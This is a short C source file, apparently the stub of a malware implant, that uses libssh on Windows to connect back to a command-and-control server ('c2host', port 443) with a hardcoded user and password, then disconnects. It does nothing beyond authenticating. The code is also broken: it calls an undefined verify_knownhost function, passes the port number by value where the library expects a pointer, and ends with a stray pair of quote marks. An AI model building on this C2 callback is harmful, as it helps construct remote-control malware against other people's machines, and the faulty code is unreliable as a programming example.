#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main() {
	ssh_session my_session;
	int rc;
	char *password;

	my_session = ssh_new();
	if (my_session == NULL)
		exit(-1);

	// Configure SSH options to connect back to the C2 server
	ssh_options_set(my_session, SSH_OPTIONS_HOST, "c2host");
	ssh_options_set(my_session, SSH_OPTIONS_PORT, 443);
	ssh_options_set(my_session, SSH_OPTIONS_USER, "c2user");


	rc = ssh_connect(my_session);

	if (verify_knownhost(my_session) < 0) {
		ssh_disconnect(my_session);
		ssh_free(my_session);
		exit(-1);
	}

	// Password should match that of C2 server
	password = ("password");

	rc = ssh_userauth_password(my_session, NULL, password);

	ssh_disconnect(my_session);
	ssh_free(my_session);''
}
